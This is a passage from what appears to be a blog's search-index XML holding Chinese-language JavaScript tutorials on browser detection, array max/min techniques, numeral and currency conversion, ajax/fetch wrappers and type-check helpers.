identity: &quot;Explorer&quot;,</span><br><span class="line">            versionSearch: &quot;MSIE&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.userAgent,</span><br><span class="line">            subString: &quot;Gecko&quot;,</span><br><span class="line">            identity: &quot;Mozilla&quot;,</span><br><span class="line">            versionSearch: &quot;rv&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;         &#x2F;&#x2F; for older Netscapes (4-)</span><br><span class="line">            string: navigator.userAgent,</span><br><span class="line">            subString: &quot;Mozilla&quot;,</span><br><span class="line">            identity: &quot;Netscape&quot;,</span><br><span class="line">            versionSearch: &quot;Mozilla&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    dataOS : [</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.platform,</span><br><span class="line">            subString: &quot;Win&quot;,</span><br><span class="line">            identity: &quot;Windows&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.platform,</span><br><span class="line">            subString: &quot;Mac&quot;,</span><br><span class="line">            identity: &quot;Mac&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">               string: navigator.userAgent,</span><br><span class="line">               subString: &quot;iPhone&quot;,</span><br><span class="line">               identity: &quot;iPhone&#x2F;iPod&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.platform,</span><br><span class="line">            subString: &quot;Linux&quot;,</span><br><span class="line">            identity: &quot;Linux&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line"> </span><br><span class="line">&#125;;</span><br><span class="line">BrowserDetect.init();</span><br><span class="line">document.write(&#39;你正在使用的是：&#39; + BrowserDetect.browser + &#39; &#39; + BrowserDetect.version + &#39; on &#39; + BrowserDetect.OS + &#39;!&#39;);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript如何求数组的最大值和最小值</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%A6%82%E4%BD%95%E6%B1%82%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC%E5%92%8C%E6%9C%80%E5%B0%8F%E5%80%BC/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>取出数组中的最大值或者最小值是开发中常见的需求，但你能想出几种方法来实现这个需求呢？</p>
<h2 id="Math-max"><a href="#Math-max" class="headerlink" title="Math.max"></a>Math.max</h2><p>JavaScript 提供了 Math.max 函数返回一组数中的最大值，用法是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Math.max([value1[,value2, ...]])</span><br></pre></td></tr></table></figure>

<p>值得注意的是：</p>
<ol>
<li> 如果有任一参数不能被转换为数值，则结果为 NaN。</li>
<li> max 是 Math 的静态方法，所以应该像这样使用：Math.max()，而不是作为 Math 实例的方法 (简单的来说，就是不使用 new )</li>
<li> 如果没有参数，则结果为 <code>-Infinity</code> (注意是负无穷大)</li>
</ol>
<p>而我们需要分析的是：</p>
<p>1.如果任一参数不能被转换为数值，这就意味着如果参数可以被转换成数字，就是可以进行比较的，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Math.max(true, 0) &#x2F;&#x2F; 1</span><br><span class="line">Math.max(true, &#39;2&#39;, null) &#x2F;&#x2F; 2</span><br><span class="line">Math.max(1, undefined) &#x2F;&#x2F; NaN</span><br><span class="line">Math.max(1, &#123;&#125;) &#x2F;&#x2F; NaN</span><br></pre></td></tr></table></figure>

<p>2.如果没有参数，则结果为 -Infinity，对应的，Math.min 函数，如果没有参数，则结果为 Infinity，所以：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var min &#x3D; Math.min();</span><br><span class="line">var max &#x3D; Math.max();</span><br><span class="line">console.log(min &gt; max);</span><br></pre></td></tr></table></figure>

<p>了解了 Math.max 方法，我们以求数组最大值的为例，思考有哪些方法可以实现这个需求。</p>
<h2 id="原始方法"><a href="#原始方法" class="headerlink" title="原始方法"></a>原始方法</h2><p>最最原始的方法，莫过于循环遍历一遍：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; [6, 4, 1, 8, 2, 11, 23];</span><br><span class="line"></span><br><span class="line">var result &#x3D; arr[0];</span><br><span class="line">for (var i &#x3D; 1; i &lt; arr.length; i++) &#123;</span><br><span class="line">    result &#x3D;  Math.max(result, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure>

<h2 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h2><p>既然是通过遍历数组求出一个最终值，那么我们就可以使用 reduce 方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; [6, 4, 1, 8, 2, 11, 23];</span><br><span class="line"></span><br><span class="line">function max(prev, next) &#123;</span><br><span class="line">    return Math.max(prev, next);</span><br><span class="line">&#125;</span><br><span class="line">console.log(arr.reduce(max));</span><br></pre></td></tr></table></figure>

<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>如果我们先对数组进行一次排序，那么最大值就是最后一个值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; [6, 4, 1, 8, 2, 11, 23];</span><br><span class="line"></span><br><span class="line">arr.sort(function(a,b)&#123;return a - b;&#125;);</span><br><span class="line">console.log(arr[arr.length - 1])</span><br></pre></td></tr></table></figure>

<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>Math.max 支持传多个参数来进行比较，那么我们如何将一个数组转换成参数传进 Math.max 函数呢？eval 便是一种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; [6, 4, 1, 8, 2, 11, 23];</span><br><span class="line"></span><br><span class="line">var max &#x3D; eval(&quot;Math.max(&quot; + arr + &quot;)&quot;);</span><br><span class="line">console.log(max)</span><br></pre></td></tr></table></figure>

<h2 id="apply"><a href="#apply" class="headerlink" title="apply"></a>apply</h2><p>使用 apply 是另一种。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; [6, 4, 1, 8, 2, 11, 23];</span><br><span class="line">console.log(Math.max.apply(null, arr))</span><br></pre></td></tr></table></figure>

<h2 id="ES6-…"><a href="#ES6-…" class="headerlink" title="ES6 …"></a>ES6 …</h2><p>使用 ES6 的扩展运算符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; [6, 4, 1, 8, 2, 11, 23];</span><br><span class="line">console.log(Math.max(...arr))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript常用工具方法(5)Number</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-(5)Number/</url>
    <content><![CDATA[<h2 id="5-Number"><a href="#5-Number" class="headerlink" title="5. Number"></a>5. Number</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*随机数范围*&#x2F;</span><br><span class="line">random (min, max) &#123;</span><br><span class="line">    if (arguments.length &#x3D;&#x3D;&#x3D; 2) &#123;</span><br><span class="line">        return Math.floor(min + Math.random() * ( (max+1) - min ))</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*将阿拉伯数字翻译成中文的大写数字*&#x2F;</span><br><span class="line">numberToChinese (num) &#123;</span><br><span class="line">    var AA &#x3D; new Array(&quot;零&quot;, &quot;一&quot;, &quot;二&quot;, &quot;三&quot;, &quot;四&quot;, &quot;五&quot;, &quot;六&quot;, &quot;七&quot;, &quot;八&quot;, &quot;九&quot;, &quot;十&quot;);</span><br><span class="line">    var BB &#x3D; new Array(&quot;&quot;, &quot;十&quot;, &quot;百&quot;, &quot;仟&quot;, &quot;萬&quot;, &quot;億&quot;, &quot;点&quot;, &quot;&quot;);</span><br><span class="line">    var a &#x3D; (&quot;&quot; + num).replace(&#x2F;(^0*)&#x2F;g, &quot;&quot;).split(&quot;.&quot;),</span><br><span class="line">        k &#x3D; 0,</span><br><span class="line">        re &#x3D; &quot;&quot;;</span><br><span class="line">    for(var i &#x3D; a[0].length - 1; i &gt;&#x3D; 0; i--) &#123;</span><br><span class="line">        switch(k) &#123;</span><br><span class="line">            case 0:</span><br><span class="line">                re &#x3D; BB[7] + re;</span><br><span class="line">                break;</span><br><span class="line">            case 4:</span><br><span class="line">                if(!new RegExp(&quot;0&#123;4&#125;&#x2F;&#x2F;d&#123;&quot; + (a[0].length - i - 1) + &quot;&#125;$&quot;)</span><br><span class="line">                    .test(a[0]))</span><br><span class="line">                    re &#x3D; BB[4] + re;</span><br><span class="line">                break;</span><br><span class="line">            case 8:</span><br><span class="line">                re &#x3D; BB[5] + re;</span><br><span class="line">                BB[7] &#x3D; BB[5];</span><br><span class="line">                k &#x3D; 0;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        if(k % 4 &#x3D;&#x3D; 2 &amp;&amp; a[0].charAt(i + 2) !&#x3D; 0 &amp;&amp; a[0].charAt(i + 1) &#x3D;&#x3D; 0)</span><br><span class="line">            re &#x3D; AA[0] + re;</span><br><span class="line">        if(a[0].charAt(i) !&#x3D; 0)</span><br><span class="line">            re &#x3D; AA[a[0].charAt(i)] + BB[k % 4] + re;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(a.length &gt; 1) &#x2F;&#x2F; 加上小数部分(如果有小数部分)</span><br><span class="line">    &#123;</span><br><span class="line">        re +&#x3D; BB[6];</span><br><span class="line">        for(var i &#x3D; 0; i &lt; a[1].length; i++)</span><br><span class="line">            re +&#x3D; AA[a[1].charAt(i)];</span><br><span class="line">    &#125;</span><br><span class="line">    if(re &#x3D;&#x3D; &#39;一十&#39;)</span><br><span class="line">        re &#x3D; &quot;十&quot;;</span><br><span class="line">    if(re.match(&#x2F;^一&#x2F;) &amp;&amp; re.length &#x3D;&#x3D; 3)</span><br><span class="line">        re &#x3D; re.replace(&quot;一&quot;, &quot;&quot;);</span><br><span class="line">    return re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*将数字转换为大写金额*&#x2F;</span><br><span class="line">changeToChinese (Num) &#123;</span><br><span class="line">        &#x2F;&#x2F;判断如果传递进来的不是字符的话转换为字符</span><br><span class="line">        if(typeof Num &#x3D;&#x3D; &quot;number&quot;) &#123;</span><br><span class="line">            Num &#x3D; new String(Num);</span><br><span class="line">        &#125;;</span><br><span class="line">        Num &#x3D; Num.replace(&#x2F;,&#x2F;g, &quot;&quot;) &#x2F;&#x2F;替换tomoney()中的“,”</span><br><span class="line">        Num &#x3D; Num.replace(&#x2F; &#x2F;g, &quot;&quot;) &#x2F;&#x2F;替换tomoney()中的空格</span><br><span class="line">        Num &#x3D; Num.replace(&#x2F;￥&#x2F;g, &quot;&quot;) &#x2F;&#x2F;替换掉可能出现的￥字符</span><br><span class="line">        if(isNaN(Num)) &#123; &#x2F;&#x2F;验证输入的字符是否为数字</span><br><span class="line">            &#x2F;&#x2F;alert(&quot;请检查小写金额是否正确&quot;);</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;&#x2F;字符处理完毕后开始转换，采用前后两部分分别转换</span><br><span class="line">        var part &#x3D; String(Num).split(&quot;.&quot;);</span><br><span class="line">        var newchar &#x3D; &quot;&quot;;</span><br><span class="line">        &#x2F;&#x2F;小数点前进行转化</span><br><span class="line">        for(var i &#x3D; part[0].length - 1; i &gt;&#x3D; 0; i--) &#123;</span><br><span class="line">            if(part[0].length &gt; 10) &#123;</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">                &#x2F;&#x2F;若数量超过拾亿单位，提示</span><br><span class="line">            &#125;</span><br><span class="line">            var tmpnewchar &#x3D; &quot;&quot;</span><br><span class="line">            var perchar &#x3D; part[0].charAt(i);</span><br><span class="line">            switch(perchar) &#123;</span><br><span class="line">                case &quot;0&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;零&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;1&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;壹&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;2&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;贰&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;3&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;叁&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;4&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;肆&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;5&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;伍&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;6&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;陆&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;7&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;柒&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;8&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;捌&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;9&quot;:</span><br><span class="line">                    tmpnewchar &#x3D; &quot;玖&quot; + tmpnewchar;</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line">            switch(part[0].length - i - 1) &#123;</span><br><span class="line">                case 0:</span><br><span class="line">                    tmpnewchar &#x3D; tmpnewchar + &quot;元&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 1:</span><br><span class="line">                    if(perchar !&#x3D; 0) tmpnewchar &#x3D; tmpnewchar + &quot;拾&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 2:</span><br><span class="line">                    if(perchar !&#x3D; 0) tmpnewchar &#x3D; tmpnewchar + &quot;佰&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 3:</span><br><span class="line">                    if(perchar !&#x3D; 0) tmpnewchar &#x3D; tmpnewchar + &quot;仟&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 4:</span><br><span class="line">                    tmpnewchar &#x3D; tmpnewchar + &quot;万&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 5:</span><br><span class="line">                    if(perchar !&#x3D; 0) tmpnewchar &#x3D; tmpnewchar + &quot;拾&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 6:</span><br><span class="line">                    if(perchar !&#x3D; 0) tmpnewchar &#x3D; tmpnewchar + &quot;佰&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 7:</span><br><span class="line">                    if(perchar !&#x3D; 0) tmpnewchar &#x3D; tmpnewchar + &quot;仟&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 8:</span><br><span class="line">                    tmpnewchar &#x3D; tmpnewchar + &quot;亿&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 9:</span><br><span class="line">                    tmpnewchar &#x3D; tmpnewchar + &quot;拾&quot;;</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line">            var newchar &#x3D; tmpnewchar + newchar;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;小数点之后进行转化</span><br><span class="line">        if(Num.indexOf(&quot;.&quot;) !&#x3D; -1) &#123;</span><br><span class="line">            if(part[1].length &gt; 2) &#123;</span><br><span class="line">                &#x2F;&#x2F; alert(&quot;小数点之后只能保留两位,系统将自动截断&quot;);</span><br><span class="line">                part[1] &#x3D; part[1].substr(0, 2)</span><br><span class="line">            &#125;</span><br><span class="line">            for(i &#x3D; 0; i &lt; part[1].length; i++) &#123;</span><br><span class="line">                tmpnewchar &#x3D; &quot;&quot;</span><br><span class="line">                perchar &#x3D; part[1].charAt(i)</span><br><span class="line">                switch(perchar) &#123;</span><br><span class="line">                    case &quot;0&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;零&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;1&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;壹&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;2&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;贰&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;3&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;叁&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;4&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;肆&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;5&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;伍&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;6&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;陆&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;7&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;柒&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;8&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;捌&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                    case &quot;9&quot;:</span><br><span class="line">                        tmpnewchar &#x3D; &quot;玖&quot; + tmpnewchar;</span><br><span class="line">                        break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(i &#x3D;&#x3D; 0) tmpnewchar &#x3D; tmpnewchar + &quot;角&quot;;</span><br><span class="line">                if(i &#x3D;&#x3D; 1) tmpnewchar &#x3D; tmpnewchar + &quot;分&quot;;</span><br><span class="line">                newchar &#x3D; newchar + tmpnewchar;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;替换所有无用汉字</span><br><span class="line">        while(newchar.search(&quot;零零&quot;) !&#x3D; -1)</span><br><span class="line">            newchar &#x3D; newchar.replace(&quot;零零&quot;, &quot;零&quot;);</span><br><span class="line">        newchar &#x3D; newchar.replace(&quot;零亿&quot;, &quot;亿&quot;);</span><br><span class="line">        newchar &#x3D; newchar.replace(&quot;亿万&quot;, &quot;亿&quot;);</span><br><span class="line">        newchar &#x3D; newchar.replace(&quot;零万&quot;, &quot;万&quot;);</span><br><span class="line">        newchar &#x3D; newchar.replace(&quot;零元&quot;, &quot;元&quot;);</span><br><span class="line">        newchar &#x3D; newchar.replace(&quot;零角&quot;, &quot;&quot;);</span><br><span class="line">        newchar &#x3D; newchar.replace(&quot;零分&quot;, &quot;&quot;);</span><br><span class="line">        if(newchar.charAt(newchar.length - 1) &#x3D;&#x3D; &quot;元&quot;) &#123;</span><br><span class="line">            newchar &#x3D; newchar + &quot;整&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        return newchar;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript常用工具方法6--Http</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-6--Http/</url>
    <content><![CDATA[<h2 id="6-Http"><a href="#6-Http" class="headerlink" title="6. Http"></a>6. Http</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @param  &#123;setting&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">ajax(setting)&#123;</span><br><span class="line">    &#x2F;&#x2F;设置参数的初始值</span><br><span class="line">    var opts&#x3D;&#123;</span><br><span class="line">        method: (setting.method || &quot;GET&quot;).toUpperCase(), &#x2F;&#x2F;请求方式</span><br><span class="line">        url: setting.url || &quot;&quot;, &#x2F;&#x2F; 请求地址</span><br><span class="line">        async: setting.async || true, &#x2F;&#x2F; 是否异步</span><br><span class="line">        dataType: setting.dataType || &quot;json&quot;, &#x2F;&#x2F; 解析方式</span><br><span class="line">        data: setting.data || &quot;&quot;, &#x2F;&#x2F; 参数</span><br><span class="line">        success: setting.success || function()&#123;&#125;, &#x2F;&#x2F; 请求成功回调</span><br><span class="line">        error: setting.error || function()&#123;&#125; &#x2F;&#x2F; 请求失败回调</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 参数格式化</span><br><span class="line">    function params_format (obj) &#123;</span><br><span class="line">        var str &#x3D; &#39;&#39;</span><br><span class="line">        for (var i in obj) &#123;</span><br><span class="line">            str +&#x3D; i + &#39;&#x3D;&#39; + obj[i] + &#39;&amp;&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        return str.split(&#39;&#39;).slice(0, -1).join(&#39;&#39;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 创建ajax对象</span><br><span class="line">    var xhr&#x3D;new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 连接服务器open(方法GET&#x2F;POST，请求地址， 异步传输)</span><br><span class="line">    if(opts.method &#x3D;&#x3D; &#39;GET&#39;)&#123;</span><br><span class="line">        xhr.open(opts.method, opts.url + &quot;?&quot; + params_format(opts.data), opts.async);</span><br><span class="line">        xhr.send();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        xhr.open(opts.method, opts.url, opts.async);</span><br><span class="line">        xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class="line">        xhr.send(opts.data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*</span><br><span class="line">    ** 每当readyState改变时，就会触发onreadystatechange事件</span><br><span class="line">    ** readyState属性存储有XMLHttpRequest的状态信息</span><br><span class="line">    ** 0 ：请求未初始化</span><br><span class="line">    ** 1 ：服务器连接已建立</span><br><span class="line">    ** 2 ：请求已接受</span><br><span class="line">    ** 3 : 请求处理中</span><br><span class="line">    ** 4 ：请求已完成，且相应就绪</span><br><span class="line">    *&#x2F;</span><br><span class="line">    xhr.onreadystatechange &#x3D; function() &#123;</span><br><span class="line">        if (xhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; (xhr.status &#x3D;&#x3D;&#x3D; 200 || xhr.status &#x3D;&#x3D;&#x3D; 304)) &#123;</span><br><span class="line">            switch(opts.dataType)&#123;</span><br><span class="line">                case &quot;json&quot;:</span><br><span class="line">                    var json &#x3D; JSON.parse(xhr.responseText);</span><br><span class="line">                    opts.success(json);</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;xml&quot;:</span><br><span class="line">                    opts.success(xhr.responseXML);</span><br><span class="line">                    break;</span><br><span class="line">                default:</span><br><span class="line">                    opts.success(xhr.responseText);</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xhr.onerror &#x3D; function(err) &#123;</span><br><span class="line">        opts.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @param  &#123;url&#125;</span><br><span class="line"> * @param  &#123;setting&#125;</span><br><span class="line"> * @return &#123;Promise&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">fetch(url, setting) &#123;</span><br><span class="line">    &#x2F;&#x2F;设置参数的初始值</span><br><span class="line">    let opts&#x3D;&#123;</span><br><span class="line">        method: (setting.method || &#39;GET&#39;).toUpperCase(), &#x2F;&#x2F;请求方式</span><br><span class="line">        headers : setting.headers  || &#123;&#125;, &#x2F;&#x2F; 请求头设置</span><br><span class="line">        credentials : setting.credentials  || true, &#x2F;&#x2F; 设置cookie是否一起发送</span><br><span class="line">        body: setting.body || &#123;&#125;,</span><br><span class="line">        mode : setting.mode  || &#39;no-cors&#39;, &#x2F;&#x2F; 可以设置 cors, no-cors, same-origin</span><br><span class="line">        redirect : setting.redirect  || &#39;follow&#39;, &#x2F;&#x2F; follow, error, manual</span><br><span class="line">        cache : setting.cache  || &#39;default&#39; &#x2F;&#x2F; 设置 cache 模式 (default, reload, no-cache)</span><br><span class="line">    &#125;</span><br><span class="line">    let dataType &#x3D; setting.dataType || &quot;json&quot;, &#x2F;&#x2F; 解析方式  </span><br><span class="line">        data &#x3D; setting.data || &quot;&quot; &#x2F;&#x2F; 参数</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 参数格式化</span><br><span class="line">    function params_format (obj) &#123;</span><br><span class="line">        var str &#x3D; &#39;&#39;</span><br><span class="line">        for (var i in obj) &#123;</span><br><span class="line">            str +&#x3D; &#96;$&#123;i&#125;&#x3D;$&#123;obj[i]&#125;&amp;&#96;</span><br><span class="line">        &#125;</span><br><span class="line">        return str.split(&#39;&#39;).slice(0, -1).join(&#39;&#39;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (opts.method &#x3D;&#x3D;&#x3D; &#39;GET&#39;) &#123;</span><br><span class="line">        url &#x3D; url + (data?&#96;?$&#123;params_format(data)&#125;&#96;:&#39;&#39;)</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        setting.body &#x3D; data || &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return new Promise( (resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">        fetch(url, opts).then( async res &#x3D;&gt; &#123;</span><br><span class="line">            let data &#x3D; dataType &#x3D;&#x3D;&#x3D; &#39;text&#39; ? await res.text() :</span><br><span class="line">                dataType &#x3D;&#x3D;&#x3D; &#39;blob&#39; ? await res.blob() : await res.json() </span><br><span class="line">            resolve(data)</span><br><span class="line">        &#125;).catch( e &#x3D;&gt; &#123;</span><br><span class="line">            reject(e)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript常用工具方法（1）类型判断</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-%EF%BC%881%EF%BC%89%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD/</url>
    <content><![CDATA[<p>##1. type 类型判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isString (o) &#123; &#x2F;&#x2F;是否字符串</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;String&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isNumber (o) &#123; &#x2F;&#x2F;是否数字</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Number&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isBoolean (o) &#123; &#x2F;&#x2F;是否boolean</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Boolean&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isFunction (o) &#123; &#x2F;&#x2F;是否函数</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Function&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isNull (o) &#123; &#x2F;&#x2F;是否为null</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Null&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isUndefined (o) &#123; &#x2F;&#x2F;是否undefined</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Undefined&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isObj (o) &#123; &#x2F;&#x2F;是否对象</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Object&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isArray (o) &#123; &#x2F;&#x2F;是否数组</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Array&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isDate (o) &#123; &#x2F;&#x2F;是否时间</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Date&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isRegExp (o) &#123; &#x2F;&#x2F;是否正则</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;RegExp&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isError (o) &#123; &#x2F;&#x2F;是否错误对象</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) 